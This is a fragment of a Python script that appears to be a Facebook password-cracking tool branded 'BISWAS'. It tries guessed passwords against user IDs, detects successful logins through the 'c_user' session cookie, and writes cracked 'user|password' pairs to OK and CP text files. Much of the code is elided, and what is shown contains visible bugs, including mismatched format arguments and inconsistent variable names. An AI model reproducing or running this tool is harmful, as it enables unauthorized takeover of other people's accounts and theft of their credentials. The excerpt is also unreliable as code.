...
\033[1;32m══════════════════════════════════════════════════════
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37mBISWAS
\033[1;31m\033[1;37m Facebook\x1b[1;97m : \033[1;37mTUFAN HERE          
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37mERROR
\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m6.0.0             
\033[1;32m══════════════════════════════════════════════════════ """                                              
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mBISWAS_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mBISWAS_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back BISWAS Menu ")
	    sarfraz()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[BISWAS] {loop}|{len(self.id)} [OK][{len(ok)}] [CP][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [BISWAS-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('BISWAS_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [BISWAS-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('BISWAS_CP.txt' , 'a').write('%s\n' % wrt)
                        break
